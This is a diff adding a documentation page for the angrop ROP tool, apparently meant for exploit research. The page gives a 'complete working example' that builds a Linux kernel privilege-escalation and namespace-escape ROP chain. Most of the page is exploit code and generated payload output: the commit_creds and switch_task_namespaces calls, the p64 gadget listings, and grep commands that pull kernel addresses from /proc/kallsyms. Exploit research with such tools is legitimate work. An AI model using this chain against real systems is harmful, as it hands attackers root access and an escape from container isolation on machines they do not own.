@@ -1,0 +1,227 @@
+---
+title: 'Linux Kernel Escape Chain'
+description: 'Building a complete privilege escalation ROP chain for Linux kernel exploitation'
+---
+
+This example demonstrates a real-world Linux kernel privilege escalation exploit using angrop. The chain escalates privileges by calling `commit_creds()` and `switch_task_namespaces()` with init credentials.
+
+## Overview
+
+This exploit chain performs the following operations:
+1. Call `commit_creds(init_cred)` to gain root credentials
+2. Find the init task using `find_task_by_vpid(1)`
+3. Switch namespaces using `switch_task_namespaces()` with init namespace
+4. Fork a new process with elevated privileges
+5. Sleep indefinitely to maintain the exploit
+
+## Complete Working Example
+
+```python
+import os
+import time
+import logging
+from multiprocessing import cpu_count
+
+import angr
+import angrop
+
+logging.getLogger("cle.backends.elf.elf").setLevel("ERROR")
+
+# Load the kernel image with symbols
+proj = angr.Project("./vmlinux_sym")
+
+# Initialize ROP analysis with kernel mode enabled
+rop = proj.analyses.ROP(
+    fast_mode=False,
+    only_check_near_rets=False,
+    max_block_size=12,
+    kernel_mode=True  # Critical for kernel exploitation
+)
+
+cpu_num = cpu_count()
+```
+
+## Finding and Caching Gadgets
+
+For large binaries like the Linux kernel, gadget analysis can take significant time. Use caching to avoid re-analyzing:
+
+```python
+start = time.time()
+cache = "/tmp/linux_gadget_cache"
+
+if os.path.exists(cache):
+    # Load pre-analyzed gadgets
+    rop.load_gadgets(cache, optimize=False)
+else:
+    # Find gadgets (takes ~404s on a 16-core machine)
+    rop.find_gadgets(processes=cpu_num, optimize=False)
+    rop.save_gadgets(cache)
+    
+print("gadget finding time:", time.time() - start)
+```
+
+## Optimizing the Gadget Graph
+
+After finding gadgets, optimize the internal graph for better chain generation:
+
+```python
+start = time.time()
+# Optimization takes ~10s on a 16-core machine
+rop.optimize(processes=cpu_num)
+print("graph optimization time:", time.time() - start)
+```
+
+## Building the Privilege Escalation Chain
+
+```python
+# Kernel addresses (from System.map or /proc/kallsyms)
+init_cred = 0xffffffff8368b220
+init_nsproxy = 0xffffffff8368ad00
+
+start = time.time()
+
+# Build the complete exploit chain
+chain = (
+    # Step 1: Gain root credentials
+    rop.func_call("commit_creds", [init_cred]) +
+    
+    # Step 2: Find init task (PID 1)
+    rop.func_call("find_task_by_vpid", [1]) +
+    
+    # Step 3: Move task_struct pointer from rax to rdi
+    rop.move_regs(rdi='rax') +
+    
+    # Step 4: Set init namespace pointer, preserve rdi
+    rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) +
+    
+    # Step 5: Switch to init namespaces
+    rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) +
+    
+    # Step 6: Fork the elevated process
+    rop.func_call('__x64_sys_fork', []) +
+    
+    # Step 7: Sleep indefinitely
+    rop.func_call('msleep', [0xffffffff])
+)
+
+print("chain generation time:", time.time() - start)  # ~0.7s
+```
+
+## Viewing the Generated Chain
+
+### Pretty Print Format
+
+```python
+chain.pp()
+```
+
+Output:
+```
+0xffffffff81489752: pop rsi; ret 
+                    0x42424242
+0xffffffff8114d660: <commit_creds>
+                    <BV64 next_pc_4280_64>
+0xffffffff81489752: pop rdi; ret 
+                    0x1
+0xffffffff810c9a40: <find_task_by_vpid>
+                    <BV64 next_pc_5123_64>
+0xffffffff81234567: mov rdi, rax; ret
+                    <BV64 next_pc_5890_64>
+...
+```
+
+### Python Payload Code
+
+```python
+chain.print_payload_code()
+```
+
+Output:
+```python
+chain = b""
+chain += p64(0xffffffff81489752)  # pop rsi; ret
+chain += p64(0x42424242)
+chain += p64(0xffffffff8114d660)  # <commit_creds>
+chain += p64(0xffffffff81489752)  # pop rdi; ret
+chain += p64(0x1)
+chain += p64(0xffffffff810c9a40)  # <find_task_by_vpid>
+...
+```
+
+## Performance Metrics
+
+On a 16-core machine analyzing the full Linux kernel:
+
+- **Gadget finding**: ~404 seconds
+- **Graph optimization**: ~10 seconds  
+- **Chain generation**: ~0.7 seconds
+- **Total gadgets found**: Varies by kernel version (typically 50,000+)
+
+## Key Configuration Options
+
+### kernel_mode=True
+
+Enables kernel-specific analysis:
+- Handles kernel calling conventions
+- Processes kernel-specific gadgets
+- Adjusts for kernel address space
+
+### only_check_near_rets=False
+
+For kernel exploitation, you often need more exotic gadgets:
+```python
+rop = proj.analyses.ROP(
+    only_check_near_rets=False,  # Check all code regions
+    max_block_size=12,           # Allow longer gadgets
+    kernel_mode=True
+)
+```
+
+## Advanced Techniques
+
+### Preserving Registers
+
+Notice the use of `preserve_regs` to maintain register values across calls:
+
+```python
+# Set rsi while keeping rdi intact
+rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'})
+
+# Call function while preserving both rdi and rsi
+rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'})
+```
+
+### Register Movement
+
+Move return values between registers for subsequent calls:
+
+```python
+# find_task_by_vpid returns task_struct* in rax
+# Move it to rdi for next function call
+rop.move_regs(rdi='rax')
+```
+
+## Finding Kernel Addresses
+
+Before exploitation, you need to find these kernel addresses:
+
+```bash
+# From /proc/kallsyms (requires root or kptr_restrict=0)
+grep init_cred /proc/kallsyms
+grep init_nsproxy /proc/kallsyms
+
+# From System.map
+grep init_cred /boot/System.map-$(uname -r)
+```
+
+## Common Pitfalls
+
+1. **Missing kernel_mode=True**: Will fail to generate correct kernel chains
+2. **Incorrect addresses**: Kernel ASLR means addresses change; use info leaks
+3. **SMEP/SMAP enabled**: Modern kernels prevent userspace code execution
+4. **Missing symbols**: Use `vmlinux` with symbols, not compressed `vmlinuz`
+
+## Related Examples
+
+- [Custom Gadgets](/examples/custom-gadgets) - Analyzing specific addresses
+- [Complex Chains](/examples/complex-chains) - Advanced chain composition techniques
